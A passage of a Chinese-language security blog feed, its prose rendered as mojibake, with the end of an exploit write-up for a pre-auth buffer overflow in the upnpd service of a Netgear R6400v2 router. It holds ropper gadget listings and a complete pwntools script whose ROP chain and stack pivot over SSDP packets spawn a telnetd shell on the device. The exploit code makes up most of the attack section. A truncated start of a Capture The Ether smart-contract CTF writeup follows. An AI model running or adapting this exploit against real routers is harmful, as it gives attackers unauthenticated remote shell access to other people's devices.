bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper -f usr/sbin/upnpd --search <span class="string">&quot;add sp, sp&quot;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘é€‰æ‹©äº†è¿™æ¡ gadget, å°†æ ˆè¿ç§»åˆ° <code>SP+0x800</code> çš„ä½ç½®ï¼Œ å¦å¤–é€šè¿‡è¿™æ¡ gadget æˆ‘å¯ä»¥æ¥ç€æ§åˆ¶ <code>R4ã€R5ã€R6ã€PC</code>  å››ä¸ªå¯„å­˜å™¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00011B90                 ADD             SP, SP, #0x800</span><br><span class="line">.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–æœ€ç»ˆæˆ‘æœŸæœ›é€šè¿‡è°ƒç”¨ <code>system</code> å‡½æ•°æ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œ å› æ­¤æˆ‘éœ€è¦åœ¨ bss è¿™æ ·å…¨å±€çš„åœ°å€ä¸Šå†™å…¥å‘½ä»¤ï¼Œ å› æ­¤æˆ‘éœ€è¦æ‰¾å¯¹åº”å¯ä»¥å¾€ä»»æ„åœ°å€å†™å…¥å€¼çš„ gadget ã€‚ åœ¨ arm çš„æ±‡ç¼–ä¸­ï¼Œå†™å…¥å€¼çš„æ±‡ç¼–æŒ‡ä»¤ä¸º <code>str</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ropper -f usr/sbin/upnpd --search <span class="string">&quot;str r?&quot;</span></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: str r?</span><br><span class="line"></span><br><span class="line">[INFO] File: usr/sbin/upnpd</span><br><span class="line">0x000299e8: str r0, [r3, <span class="comment">#0x214]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000167e0: str r0, [r4, <span class="comment">#0x40]; ldr r3, [pc, #0x54]; mvn r2, #0; mov r0, #0; str r2, [r3, #4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0000ba2c: str r0, [r5]; mov r0, r4; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0002d448: str r2, [r3, <span class="comment">#-0x974]; bl #0x3bf4; movw r0, #0x1f5; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002d468: str r2, [r3, <span class="comment">#-0x974]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x0002b360: str r2, [r3, <span class="comment">#0x248]; pop &#123;r3, pc&#125;;</span></span><br><span class="line">0x000182ec: str r2, [r3, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x000167f0: str r2, [r3, <span class="comment">#4]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002b458: str r2, [r3]; add sp, sp, <span class="comment">#0x10; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0002af38: str r2, [r3]; bl <span class="comment">#0x326c; mov r0, r5; add sp, sp, #0x50; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x0000ba6c: str r2, [r3]; bx lr;</span><br><span class="line">0x0000ba60: str r2, [r3]; mov r2, <span class="comment">#7; ldr r3, [sp, #4]; str r2, [r3]; bx lr;</span></span><br><span class="line">0x00017da0: str r2, [r3]; pop &#123;r3, pc&#125;;</span><br><span class="line">0x0002b524: str r2, [r3]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0000f120: str r3, [ip]; bl <span class="comment">#0x2e94; mov r0, #0; add sp, sp, #0xc; pop &#123;r4, r5, pc&#125;;</span></span><br><span class="line">0x00029950: str r3, [r2, <span class="comment">#0x200]; pop &#123;r3, r4, r5, pc&#125;;</span></span><br><span class="line">0x000182fc: str r3, [r2, <span class="comment">#4]; bx lr;</span></span><br><span class="line">0x00013d80: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x2c; add sp, sp, #0x800; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00013900: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #0x800; pop &#123;r4, r5, r6, pc&#125;;</span></span><br><span class="line">0x00013af4: str r3, [r2]; mov r0, <span class="comment">#0; add sp, sp, #4; add sp, sp, #0x1000; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017d64: str r3, [r4, <span class="comment">#0x140]; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x0000bac8: str r3, [r4]; add r0, r0, <span class="comment">#0x18400; add r0, r0, #0x2a0; pop &#123;r4, pc&#125;;</span></span><br><span class="line">0x000272ec: str r3, [r4]; pop &#123;r4, pc&#125;;</span><br><span class="line">0x0002dd64: str r3, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br><span class="line">0x0000bc1c: str r3, [sp, <span class="comment">#4]; bl #0x3278; add sp, sp, #8; pop &#123;lr&#125;; add sp, sp, #0xc; bx lr;</span></span><br><span class="line">0x00014188: str r4, [sp, <span class="comment">#0xfc]; str ip, [sp, #0xf8]; bl #0x33b0; mov r0, r4; add sp, sp, #0x104; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x00017e98: str r5, [sp, <span class="comment">#4]; bl #0x308c; mov r0, r4; bl #0x2e64; add sp, sp, #0xd4; pop &#123;r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line">0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span><br></pre></td></tr></table></figure><p>å¯¹äºè¿™æ ·çš„éœ€æ±‚ï¼Œæˆ‘ä»è¿™äº› gadget ä¸­é€‰å–äº† <code>0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</code> è¿™æ¡æŒ‡ä»¤ï¼Œ é€šè¿‡æ§åˆ¶ r5ã€ r6 å¯„å­˜å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»»æ„å€¼ä»r6 å†™åˆ° r5 æ‰€æŒ‡å‘åˆ°åœ°å€ä¸­ã€‚ç„¶åæˆ‘é€šè¿‡ for å¾ªç¯å°±å¯ä»¥æ„é€ å‡ºå°†ä»»æ„å­—ç¬¦ä¸²ï¼Œå†™åˆ°ä»»æ„åœ°å€ä¸­çš„ rop é“¾</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br></pre></td></tr></table></figure><p>æœ€åå‘¢ï¼Œåœ¨æ‰¾ä¸€æ¡ <code>mov r0, r?, bl system </code>  è¿™æ ·çš„gadgetï¼Œ å°†ä¸ºå¯æ§çš„ <code>R3</code> åˆ° <code>R7</code> å¯„å­˜å™¨ä¸­çš„ä¸€ä¸ªè¦†å†™æˆåˆšåˆšå†™å…¥äº†å‘½ä»¤çš„åœ°å€ï¼Œç„¶åå°†å€¼ mov åˆ° <code>r0</code> å¯„å­˜å™¨ä¸Šã€‚ å› ä¸º arm åˆ°å‚æ•°ä¼ é€’æ˜¯ç”±å¯„å­˜å™¨ä¼ é€’çš„ï¼Œé€šè¿‡æ§åˆ¶ <code>r0</code> å¯„å­˜å™¨ï¼Œ æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ <code>system</code> æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><p>è¿™é‡Œäº†ä½¿ç”¨çš„æ˜¯ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0002704C                 MOV             R0, R4  ; command</span><br><span class="line">.text:00027050                 BL              system</span><br></pre></td></tr></table></figure><p>æ‰¾é½æ‰€æœ‰çš„gadget ï¼Œå¹¶ä¸”å°† rop é“¾å¸ƒç½®åˆ° <code>SP+0x800</code>çš„ä½ç½®ï¼Œ å› æ­¤ç¬¬ä¸€æ¬¡é“¾æ¥åˆ°ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"> </span><br><span class="line">s = remote(<span class="string">&#x27;10.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><p>ç„¶åç¬¬äºŒæ¬¡é“¾æ¥ï¼Œä¸ºåªéœ€åŠ«æŒè¿”å›åœ°å€åˆ° stack pivot  çš„åœ°å€ä¸Šå³å¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#.text:00011B90                 ADD             SP, SP, #0x800</span></span><br><span class="line"><span class="comment">#.text:00011B94                 POP             &#123;R4-R6,PC&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>]) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;10.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æœ€åçš„ exploitä¸ºå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req</span>():</span></span><br><span class="line">    temp=[]</span><br><span class="line">    temp.append(<span class="string">&quot;M-SEARCH * HTTP/1.1&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;HOST:239.255.255.250:1900&quot;</span>)</span><br><span class="line">    temp.append(<span class="string">&#x27;MAN: &quot;ssdp:discover&quot;&#x27;</span>)</span><br><span class="line">    temp.append(<span class="string">&quot;MX: &quot;</span> + cyclic(<span class="number">139</span>, n = <span class="number">4</span>).decode(<span class="string">&#x27;latin&#x27;</span>) + p32(<span class="number">0x11B90</span>)[:<span class="number">3</span>].decode(<span class="string">&#x27;latin&#x27;</span>)) <span class="comment">#seconds to delay response</span></span><br><span class="line"></span><br><span class="line">    temp=<span class="string">&#x27;\r\n&#x27;</span>.join(temp)+<span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(temp)</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x8F874</span></span><br><span class="line">str_r6_r5 = <span class="number">0x0002dd4c</span></span><br><span class="line"><span class="comment"># 0x0002dd4c: str r6, [r5]; pop &#123;r3, r4, r5, r6, r7, pc&#125;;</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/usr/sbin/telnetd -p 3343 -b 0.0.0.0 -l /bin/sh \x00&quot;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write cmd to bss</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_rop</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    rop += cyclic(<span class="number">355</span>,n=<span class="number">4</span>)</span><br><span class="line">    rop += p32(<span class="number">0xdeadbeaf</span>)         <span class="comment"># R4</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R5</span></span><br><span class="line">    rop += cmd[:<span class="number">4</span>]                 <span class="comment"># R6</span></span><br><span class="line">    rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(cmd)/<span class="number">4</span> - <span class="number">1</span>)):</span><br><span class="line">        log.success(<span class="string">&#x27;idx: &#123;&#125;&#x27;</span>.format(i))</span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R4</span></span><br><span class="line">        rop += p32(bss+<span class="number">4</span>*(i+<span class="number">1</span>))        <span class="comment"># R5</span></span><br><span class="line">        rop += cmd[<span class="number">4</span>*(i+<span class="number">1</span>): <span class="number">4</span>*(i+<span class="number">2</span>)]   <span class="comment"># R6</span></span><br><span class="line">        rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">        rop += p32(str_r6_r5)          <span class="comment"># PC</span></span><br><span class="line"></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R3</span></span><br><span class="line">    rop += p32(bss)                <span class="comment"># R4</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R5</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R6</span></span><br><span class="line">    rop += p32(<span class="number">0xdeadbeef</span>)         <span class="comment"># R7</span></span><br><span class="line">    rop += p32(<span class="number">0x2704C</span>)            <span class="comment"># PC              call system</span></span><br><span class="line">    <span class="comment"># .text:0002704C                 MOV             R0, R4  ; command</span></span><br><span class="line">    <span class="comment"># .text:00027050                 BL              system</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> rop</span><br><span class="line"></span><br><span class="line">s = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x1ff0</span>)</span><br><span class="line"><span class="comment"># ropchain</span></span><br><span class="line">s.send(<span class="string">b&#x27;\x00&#x27;</span> + build_rop(cmd))</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>, typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pivot stack</span></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += build_req()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;exploit .....&#x27;</span>)</span><br><span class="line"></span><br><span class="line">t.send(rop)</span><br></pre></td></tr></table></figure><h2 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h2><p>ã€1ã€‘ <a href="https://kb.netgear.com/000064493/Security-Advisory-for-Post-Authentication-Buffer-Overflow-on-Some-Routers-Extenders-and-WiFi-Systems-PSV-2020-0437">PSV-2020-0437 å®˜æ–¹å…¬å‘Š</a><br>ã€2ã€‘ <a href="https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.102_10.0.75.zip">R6400v2-1.0.4.102 å›ºä»¶</a><br>ã€3ã€‘ <a href="https://github.com/therealsaumil/custom_nvram">Shared Library to intercept nvram</a><br>ã€4ã€‘ <a href="https://ssd-disclosure.com/ssd-advisory-netgear-nighthawk-r8300-upnpd-preauth-rce/">SSD Advisory - Netgear Nighthawk R8300 upnpd PreAuth RCE - SSD</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-45527 </tag>
            
            <tag> netgear </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Capture The Ether Writeup</title>
      <link href="Capture-The-Ether-writeup.html"/>
      <url>Capture-The-Ether-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>Capture the ether æ˜¯ä¸€ä¸ªé€‚åˆç”¨æ¥å…¥é—¨åˆçº¦çš„ wargame å¹³å°ã€‚æˆ‘æœ€è¿‘ä¸€ç›´åˆ°äº”ä¸€èŠ±äº†ç‚¹æ—¶é—´åšäº†ä¸‹ä¸€ä¸‹ã€‚ å¦å¤–è¿™é‡Œæ„Ÿè°¢ @0x9k @pikachu @xhyumiracle @iczc ç»™æˆ‘æä¾›çš„å¸®åŠ©ã€‚</p><h2 id="å¹³å°åœ°å€"><a href="#å¹³å°åœ°å€" class="headerlink" title="å¹³å°åœ°å€"></a>å¹³å°åœ°å€</h2><p><a href="https://capturetheether.com/challenges/">Capture the Ether - Challenges</a></p><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><h3 id="1-Deploy-a-contract"><a href="#1-Deploy-a-contract" class="headerlink" title="1. Deploy a contract"></a>1. Deploy a contract</h3><p><strong>é¢˜ç›®æè¿°ï¼š</strong></p><p>To complete this challenge, you need to:</p><ol><li>InstallÂ <a href="https://metamask.io/">MetaMask</a>.</li><li>Switch to theÂ <strong>Ropsten test network</strong>.</li><li>Get some Ropsten ether. Clicking the â€œbuyâ€ button in MetaMask will take you to aÂ <em>faucet</em>Â that gives out free test ether.</li></ol><p>After youâ€™ve done that, press the red button on the left to deploy the challenge contract.</p><p>You donâ€™t need to do anything with the contract once itâ€™s deployed. Just click the â€œCheck Solutionâ€ button to verify that you deployed successfully.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DeployChallenge &#123;</span><br><span class="line">    &#x2F;&#x2F; This tells the CaptureTheFlag contract that the challenge is complete.</span><br><span class="line">    function isComplete() public pure returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è§£é¢˜</strong></p><p>å®‰è£…å®Œ <code>MetaMask</code> åï¼Œ å¼€å¯æµ‹è¯•ç½‘ç»œã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-04-19-d8ab7eb4741c491ecc1eff595c57683a-f7da6b.png"></a></p><p>è·å–ä»£å¸ï¼š é€šå¸¸ <code>MetaMask</code> åˆ‡æ¢åˆ° Ropsten æµ‹è¯•ç½‘ç»œåï¼Œ ç‚¹å‡»è´­ä¹°ï¼Œ å¯ä»¥çœ‹åˆ°ä¸€ä¸ª <code>æµ‹è¯•æ°´ç®¡</code> ï¼Œå¯ä»¥ä»ä¸€ä¸ªæ°´é¾™å¤´è·å–ä»£å¸</p><p>æ°´é¾™å¤´ï¼š <a href="https://faucet.metamask.io/">https://faucet.metamask.io/</a> </p><p>ä½†æ˜¯è¿™ä¸ªæ°´é¾™å¤´æˆ‘è·å–ä¸åˆ°ä»£å¸ï¼Œæœ€åç”¨äº† @iczc çš„æ°´é¾™å¤´è·å–çš„ï¼š <a href="https://faucet.chainflag.org/">ETH Testnet Faucet (chainflag.org)</a></p><h3 id="2-callme"><a href="#2-callme" class="headerlink" title="2. callme"></a>2. callme</h3><p><strong>é¢˜ç›®æè¿°</strong></p><p>To complete this challenge, all you need to do is call a function.</p><p>The â€œBegin Challengeâ€ button will deploy the following contract:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract CallMeChallenge &#123;</span><br><span class="line">    bool public isComplete &#x3D; false;</span><br><span class="line"></span><br><span class="line">    function callme() public &#123;</span><br><span class="line">        isComplete &#x3D; true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Call the function namedÂ <code>callme</code>Â and then click the â€œCheck Solutionâ€ button.</p><p>Enjoy this inspirational music while you work:Â <a 